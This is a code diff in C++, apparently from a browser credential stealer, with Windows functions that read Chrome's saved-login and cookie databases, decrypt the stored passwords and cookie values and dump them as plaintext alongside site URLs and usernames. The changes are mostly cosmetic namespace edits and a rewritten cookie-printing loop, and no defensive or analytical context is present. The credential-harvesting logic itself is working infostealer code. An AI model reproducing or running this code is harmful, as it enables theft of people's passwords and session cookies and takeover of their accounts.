@@ -2,11 +2,11 @@
 
 #if defined(__WIN64__)
 
-std::stringstream get_chrome_pass(sqlite3* db)
+stringstream get_chrome_pass(sqlite3* db)
 {
-    std::string sql = "SELECT action_url, username_value, password_value FROM logins";
+    string sql = "SELECT action_url, username_value, password_value FROM logins";
 
-    std::stringstream dump(std::string(""));
+    stringstream dump(string(""));
     sqlite3_stmt *pStmt;
     int rc;
     rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
@@ -17,11 +17,11 @@ std::stringstream get_chrome_pass(sqlite3* db)
     }
 
     rc = sqlite3_step(pStmt);
-    //std::cout << "RC: " << rc << std::endl;
-    while (rc == SQLITE_ROW) 
+    //cout << "RC: " << rc << endl;
+    while(rc == SQLITE_ROW)
     {
-        dump << sqlite3_column_text(pStmt, 0) << std::endl;
-        dump << (char *)sqlite3_column_text(pStmt, 1) << std::endl;
+        dump << sqlite3_column_text(pStmt, 0) << endl;
+        dump << (char *)sqlite3_column_text(pStmt, 1) << endl;
 
         DATA_BLOB encryptedPass, decryptedPass;
 
@@ -39,13 +39,13 @@ std::stringstream get_chrome_pass(sqlite3* db)
                 0,
                 &decryptedPass);
         char *password = (char *)decryptedPass.pbData;
-        while (isprint(*password))
+        while(isprint(*password))
         {
             dump << *password;
             password++;
         }
 
-        dump << std::endl;
+        dump << endl;
         free(encryptedPass.pbData);
         rc = sqlite3_step(pStmt);
     }
@@ -54,11 +54,11 @@ std::stringstream get_chrome_pass(sqlite3* db)
     return dump;
 }
 
-std::stringstream get_chrome_cookies(sqlite3* db)
+stringstream get_chrome_cookies(sqlite3* db)
 {
-    std::string sql = "SELECT HOST_KEY, path, encrypted_value FROM cookies";
+    string sql = "SELECT HOST_KEY, path, encrypted_value FROM cookies";
 
-    std::stringstream dump(std::string(""));
+    stringstream dump(string(""));
     sqlite3_stmt *pStmt;
     int rc;
     rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
@@ -67,11 +67,11 @@ std::stringstream get_chrome_cookies(sqlite3* db)
         dump << "statement failed rc = " << rc;
         return dump;
     }
-    std::cout << std::endl;
+    cout << endl;
 
     rc = sqlite3_step(pStmt);
-    //std::cout << "RC: " << rc << std::endl;
-    while (rc == SQLITE_ROW) 
+    //cout << "RC: " << rc << endl;
+    while(rc == SQLITE_ROW)
     {
         dump << sqlite3_column_text(pStmt, 0) << " ";
         dump << (char *)sqlite3_column_text(pStmt, 1) << " ";
@@ -91,14 +91,17 @@ std::stringstream get_chrome_cookies(sqlite3* db)
                 NULL,
                 0,
                 &decryptedCookies);
-        char *cookies = (char *)decryptedCookies.pbData;
-        while (isprint(*cookies))
+        //char *cookies = (char *)decryptedCookies.pbData;
+        int i=0;
+        while(decryptedCookies.pbData[i])
         {
-            dump << *cookies;
-            cookies++;
+            //dump << *cookies;
+            dump << decryptedCookies.pbData[i];
+            i++;
+            //cookies++;
         }
 
-        dump << std::endl;
+        dump << endl;
         free(encryptedCookies.pbData);
         rc = sqlite3_step(pStmt);
     }
@@ -112,17 +115,17 @@ int callback(void *NotUsed, int argc, char **argv, char **azColName)
 {
     for(int i = 0; i < argc; i++) 
     {
-        std::cout << azColName[i] << ": " << argv[i] << std::endl;
+        cout << azColName[i] << ": " << argv[i] << endl;
     }
-    std::cout << std::endl;
+    cout << endl;
     return 0;
 }
 
 #elif defined(__linux__)
 
-std::stringstream get_chrome_pass(sqlite3* db)
+stringstream get_chrome_pass(sqlite3* db)
 {
-    return std::stringstream(std::string(""));
+    return stringstream(string(""));
 }
 
 #endif
